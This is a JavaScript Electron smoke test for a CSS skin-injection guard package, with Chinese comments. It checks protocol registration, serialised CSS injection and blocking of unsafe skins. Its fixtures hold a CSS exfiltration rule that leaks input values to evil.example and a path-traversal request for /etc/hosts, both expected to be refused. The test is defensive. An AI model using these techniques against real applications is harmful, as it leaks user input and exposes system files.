"use strict";
/**
 * @css-guard/electron 的端到端测试。跑在真的 Electron 里，因为这个包做的三件事
 * （协议注册时机、insertCSS 串行、注入前拦截）离开 Electron 一件都验不了。
 *
 *     npx electron packages/electron/test/smoke.js
 */
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { registerSkinScheme, createSkinHost } = require("../src/index.js");

const SCHEME = "testskin";
registerSkinScheme(SCHEME);          // 必须在 ready 之前，这一行的位置本身就是被测对象

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), "dsh-host-"));
const write = (id, css, meta = {}) => {
  const dir = path.join(ROOT, id);
  fs.mkdirSync(path.join(dir, "assets"), { recursive: true });
  fs.writeFileSync(path.join(dir, "skin.json"), JSON.stringify({ name: id, ...meta }));
  fs.writeFileSync(path.join(dir, "skin.css"), css);
  return dir;
};
const VARS = ":root{--color-bg:#101;--color-text:#eee;--color-accent:#7f9bff;}";
write("good", `${VARS}\n#app{background-image:url("__SKIN__/bg.svg");}`, { backdrops: [] });
fs.writeFileSync(path.join(ROOT, "good", "assets", "bg.svg"),
  '<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4" fill="#123"/></svg>');
write("leaky", `${VARS}\ninput[value^="a"]{background:url(https://evil.example/?a);}`);

const { app, BrowserWindow, net } = require("electron");

const checks = [];
const check = (name, pass, detail = "") => {
  checks.push(Boolean(pass));
  console.log(`${pass ? "  ok  " : "  FAIL"} ${name}${detail ? `  — ${detail}` : ""}`);
};

app.whenReady().then(async () => {
  const skins = createSkinHost({ roots: [ROOT], scheme: SCHEME });
  skins.install();

  check("扫到了两套皮肤", skins.list().length === 2, skins.list().map((s) => s.id).join(", "));

  const asset = await net.fetch(`${SCHEME}://skin/good/bg.svg`);
  check("素材走自定义协议取得到", asset.status === 200, `HTTP ${asset.status}`);
  const escaped = await net.fetch(`${SCHEME}://skin/good/../../../../etc/hosts`);
  check("路径穿越取不到", escaped.status !== 200, `HTTP ${escaped.status}`);

  const win = new BrowserWindow({ show: false, webPreferences: { contextIsolation: true } });
  await win.loadURL(`data:text/html,${encodeURIComponent('<meta charset="utf-8"><div id="app">host</div>')}`);
  skins.attach(win);

  const ok = (await skins.apply("good"))[0];
  check("干净皮肤注入成功", ok.ok, ok.error || "");
  const accent = await win.webContents.executeJavaScript(
    `getComputedStyle(document.documentElement).getPropertyValue("--color-accent").trim()`);
  check("宿主页面算出来的强调色变了", accent === "#7f9bff", accent || "空");
  const bg = await win.webContents.executeJavaScript(
    `getComputedStyle(document.getElementById("app")).backgroundImage`);
  check("素材 URL 被换成了自定义协议", bg.includes(`${SCHEME}://skin/good/`), bg.slice(0, 60));

  const blocked = (await skins.apply("leaky"))[0];
  check("会外泄的皮肤被拒绝注入", blocked.ok === false, blocked.error || "");
  const after = await win.webContents.executeJavaScript(
    `getComputedStyle(document.documentElement).getPropertyValue("--color-accent").trim()`);
  check("被拒绝后旧皮肤也撤干净了", after === "", `残留 "${after}"`);

  // 并发切换：串行队列如果没生效，最后留在页面里的就不一定是最后套用的那套。
  await Promise.all([skins.applyTo(win, "good"), skins.applyTo(win, "none"), skins.applyTo(win, "good")]);
  const final = await win.webContents.executeJavaScript(
    `getComputedStyle(document.documentElement).getPropertyValue("--color-accent").trim()`);
  check("并发切换后状态与最后一次一致", final === "#7f9bff", `实际 "${final}"`);

  const failed = checks.filter((c) => !c).length;
  console.log(`\n${checks.length - failed}/${checks.length} 通过`);
  fs.rmSync(ROOT, { recursive: true, force: true });
  app.exit(failed ? 1 : 0);
});
